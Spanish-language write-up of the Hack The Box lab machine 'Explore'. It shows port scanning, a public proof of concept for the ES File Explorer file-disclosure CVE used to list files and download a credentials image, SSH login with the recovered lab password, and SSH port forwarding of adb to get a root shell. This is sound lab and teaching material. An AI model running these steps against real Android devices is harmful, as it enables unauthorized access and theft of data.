---
layout: post
title: HTB Explore
date: '2024-01-09 21:31:10 -0500'
categories: [HTB, Easy]
tags: [ CVE, infoDisclosure ,  Android , Adb , Portforwarding , Pivoting , SSH ] 
image:
  path: /explore/preview.png
  alt: Explore
---

## Resumen 
![logo](/explore/logo.png){: .right w="200" h="200" }

**Explore** es una máquina fascinante y me sumergí en un sistema operativo completamente nuevo para mí. Inicié con una enumeración de los servicios en la máquina, identificando el uso de un servicio relacionado con la lectura de archivos. Este servicio presentaba una vulnerabilidad conocida (CVE) que permitía realizar una divulgación de información (**information disclosure**) y acceder a los datos del equipo.

Posteriormente, descubrí un archivo que contenía las credenciales del usuario, lo que posibilitó el acceso al equipo mediante SSH. Continuando con la enumeración, noté que el servicio adb estaba en ejecución en el equipo, lo cual requería la realización de un port forwarding para extraerlo al equipo atacante y así interactuar con él, ya que estaba bloqueado por el firewall del dispositivo Android.

Finalmente, una vez completado el port forwarding, pude lanzar una terminal como usuario root aprovechando los privilegios asociados al servicio adb.


## Reconocimiento

Para empezar, se realiza un **ping** para verificar la conectividad con la máquina.

```bash
ping 10.10.10.247  -c 1

PING 10.10.10.247 (10.10.10.247) 56(84) bytes of data.
64 bytes from 10.10.10.247: icmp_seq=1 ttl=63 time=182 ms

--- 10.10.10.247 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 181.667/181.667/181.667/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos


Ahora se procede a realizar un escaneo con **nmap** para identificar qué puertos están abiertos dentro de la máquina.

```bash
nmap -p- --min-rate 3000 10.10.10.247  -Pn   -oG ports

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 22:05 EST
Nmap scan report for 10.10.10.247
Host is up (0.18s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
41751/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown
```
{: .nolineno}


Con la información de los puertos obtenida, se puede llevar a cabo un escaneo más exhaustivo para identificar las tecnologías y versiones asociadas a dichos puertos.
```bash
nmap -p2222,42135,42371,59777 10.10.10.247  -sVC -oN versions -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 22:06 EST
Nmap scan report for 10.10.10.247
Host is up (0.25s latency).

PORT      STATE  SERVICE VERSION
2222/tcp  open   ssh     (protocol 2.0)
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
42135/tcp open   http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
42371/tcp closed unknown
59777/tcp open   http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.94SVN%I=7%D=1/9%Time=659E09B9%P=x86_64-pc-linux-gnu%r(
SF:NULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
Service Info: Device: phone
```
{: .nolineno}


## Enumeración

Al investigar vulnerabilidades relacionadas con **ES File Explorer**, se descubre la existencia de un **CVE** que posibilita realizar una divulgación de información (**information disclosure**) sobre los datos almacenados en el servidor. Gracias a esta vulnerabilidad, se puede inferir que el host es un servidor Android, ya que está reliacionada a una aplicación que corre en los mismos.
    

>ES File Explorer es un administrador/explorador de archivos diseñado por ES Global, una subsidiaria de DO Global, para dispositivos Android. Incluye funciones como integración de almacenamiento en la nube, transferencia de archivos de Android a Windows a través de FTP o LAN y un navegador raíz.
{: .prompt-info}


![cve](/explore/cve.png)


## Explotación

Ahora solo es necesario ejecutar el [exploit](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln) para aprovechar la vulnerabilidad.


```bash
python poc.py --cmd listFiles --ip 10.10.10.247
[*] Executing command: listFiles on 10.10.10.247
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"storage", "time":"1/9/24 10:12:16 PM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", }, 
{"name":"sepolicy", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"357.18 KB (365,756 Bytes)", }, 
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sbin", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", }, 
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"proc", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"plat_service_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"13.73 KB (14,057 Bytes)", }, 
{"name":"plat_seapp_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"1.28 KB (1,315 Bytes)", }, 
{"name":"plat_property_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"6.53 KB (6,687 Bytes)", }, 
{"name":"plat_hwservice_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"7.04 KB (7,212 Bytes)", }, 
{"name":"plat_file_contexts", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"23.30 KB (23,863 Bytes)", }, 
{"name":"oem", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", }, 
{"name":"odm", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", }, 
{"name":"mnt", "time":"1/9/24 10:12:13 PM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", }, 
{"name":"init.zygote64_32.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"875.00 Bytes (875 Bytes)", }, 
{"name":"init.zygote32.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"511.00 Bytes (511 Bytes)", }, 
{"name":"init.usb.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"5.51 KB (5,646 Bytes)", }, 
{"name":"init.usb.configfs.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"7.51 KB (7,690 Bytes)", }, 
{"name":"init.superuser.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"582.00 Bytes (582 Bytes)", }, 
{"name":"init.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"29.00 KB (29,697 Bytes)", }, 
{"name":"init.environ.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"1.04 KB (1,064 Bytes)", }, 
{"name":"init.android_x86_64.rc", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"3.36 KB (3,439 Bytes)", }, 
{"name":"init", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", }, 
{"name":"fstab.android_x86_64", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"753.00 Bytes (753 Bytes)", }, 
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dev", "time":"1/9/24 10:12:14 PM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", }, 
{"name":"default.prop", "time":"1/9/24 10:12:12 PM", "type":"file", "size":"1.09 KB (1,118 Bytes)", }, 
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"d", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"config", "time":"1/9/24 10:12:13 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"cache", "time":"1/9/24 10:12:13 PM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", }, 
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", }, 
{"name":"acct", "time":"1/9/24 10:12:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```
{: .nolineno}


Además de listar los archivos, también es posible eliminar las imágenes, revelando así información interesante en ellas con el siguiente comando:


```bash
python poc.py --cmd listPics --ip 10.10.10.247

[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```
{: .nolineno}

Se observa un archivo llamativo denominado **creds.jpg**. Por lo tanto, se plantea la posibilidad de intentar transferirlo a nuestro equipo para examinar su contenido.


```bash
python poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.10.10.247
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
	from: 10.10.10.247
[*] Server responded with: 200
[*] Writing to file: creds.jpg
```
{: .nolineno}

Dentro de este archivo, parece haber una pareja de usuario y contraseña. Por lo tanto, se plantea la opción de intentar acceder al equipo mediante el servicio SSH utilizando dichas credenciales.


![creds](/explore/creds.png)




```bash
ssh kristi@10.10.10.247 -p 2222
Unable to negotiate with 10.10.10.247 port 2222: no matching host key type found. Their offer: ssh-rsa
```
{: .nolineno}


Lamentablemente, se encuentra un error. Después de investigar un poco, se descubre que se puede solucionar utilizando la siguiente **flag**.


```bash
ssh kristi@10.10.10.247 -p 2222 -oHostKeyAlgorithms=ssh-rsa
Password authentication
(kristi@10.10.10.247) Password: Kr1sT!5h@Rp3xPl0r3!
:/ $ whoami
u0_a76
:/ $ hostname
localhost
```
{: .nolineno}

## Escalada de Privilegios

Una vez dentro del equipo, se observa que el puerto **5555**, que anteriormente fue filtrado por nmap, ahora está abierto. Se procede a investigar qué servicio suele ejecutarse en dicho puerto.


```bash
netstat -tunlp                                                            
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp        0      1 10.10.10.247:60240      1.0.0.1:853             SYN_SENT    -
tcp        0      1 10.10.10.247:55204      1.1.1.1:853             SYN_SENT    -
tcp6       0      0 :::2222                 :::*                    LISTEN      3701/net.xnano.android.sshserver
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 ::ffff:127.0.0.1:34389  :::*                    LISTEN      -
tcp6       0      0 ::ffff:10.10.10.2:44405 :::*                    LISTEN      -
tcp6       0      0 :::59777                :::*                    LISTEN      -
tcp6       0      0 ::ffff:10.10.10.2:59777 ::ffff:10.10.14.1:42030 CLOSE_WAIT  -
udp        0      0 10.10.10.247:41034      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:53391      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:43226      1.1.1.1:53              ESTABLISHED -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 10.10.10.247:58688      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:47496      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:61921      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:46746      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:42665      1.0.0.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:62155      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:34547      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:57162      1.1.1.1:53              ESTABLISHED -
udp        0      0 0.0.0.0:52121           0.0.0.0:*                           -
udp        0      0 10.10.10.247:54182      1.1.1.1:53              ESTABLISHED -
udp        0      0 10.10.10.247:58335      1.1.1.1:53              ESTABLISHED -
udp6       0      0 :::5353                 :::*                                -
udp6       0      0 :::5353                 :::*                                -
udp6       0      0 :::40278                :::*                                -
udp6       0      0 :::1900                 :::*                                -
udp6       0      0 ::ffff:10.10.10.2:53121 :::*                                -
```
{: .nolineno}


![adb](/explore/adb.png)


>Android Debug Bridge es una herramienta de programación utilizada para la depuración de dispositivos basados ​​en Android. El daemon en el dispositivo Android se conecta con el servidor en la PC host a través de USB o TCP, que se conecta al cliente que usa el usuario final a través de TCP.
{: .prompt-info}


Se desea verificar si el servicio de **adb** está en ejecución mediante el comando `ps`, y se confirma que el demonio está corriendo bajo el usuario **shell**.

```bash
ps -fe | grep adb                                                         
shell         1667     1 0 22:12:12 ?     00:00:00 adbd --root_seclabel=u:r:su:s0
```
{:  .nolineno}

Con esta información en mente, se plantea la posibilidad de realizar un **port forwarding** para trabajar desde nuestra máquina con ese puerto. Primero, es necesario verificar si el puerto **5555** está ocupado.


```bash
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:56890           0.0.0.0:*                           -                   
```
{: .nolineno}

Ahora, se procede a realizar la conexión por SSH, especificando el puerto que se desea traer a la máquina local.

```bash
ssh kristi@10.10.10.247 -p 2222 -oHostKeyAlgorithms=ssh-rsa  -L 5555:127.0.0.1:5555
Password authentication
(kristi@10.10.10.247) Password: Kr1sT!5h@Rp3xPl0r3!
:/ $ 
```
{: .nolineno}

Se verifica el estado del puerto mediante el uso de `netstat` para confirmar si la operación se realizó de manera adecuada.

```bash
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      3898/ssh            
tcp6       0      0 ::1:5555                :::*                    LISTEN      3898/ssh            
udp        0      0 0.0.0.0:56890           0.0.0.0:*                           -                   
```
{: .nolineno}




Con esto, se logra interactuar con **adb** desde nuestra máquina atacante. Es importante señalar que, en algunos equipos, esta herramienta no viene por defecto y es necesario descargarla.  Y en primer lugar se va a revisar cuantos equipos se encuentran conectados.



```bash
adb devices
List of devices attached
emulator-5554	device
```
{: .nolineno}


Posteriormente, se intentan ejecutar comandos, pero se observa que se están ejecutando como el usuario **shell**.

```bash
adb shell id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
```
{: .nolineno}

Ante esta situación, se intenta lanzar la shell como **root**. Como se evidenció previamente mediante el proceso enumerado, esto es posible en la actualidad, por lo que al ejecutar este comando se obtendrían privilegios de **root**.


```bash
adb root
restarting adbd as root
```
{: .nolineno}


Ahora se puede confirmar que el usuario que ejecuta los comandos es el usuario root con el el comando `id`: 

```bash
adb shell id

uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
```
{: .nolineno}

Finalmente, se lanza una shell como el usuario de maximos privilegios.

```bash
adb shell
x86_64:/ # whoami                                                                                                                 
root
x86_64:/ # 
```
{: .nolineno}













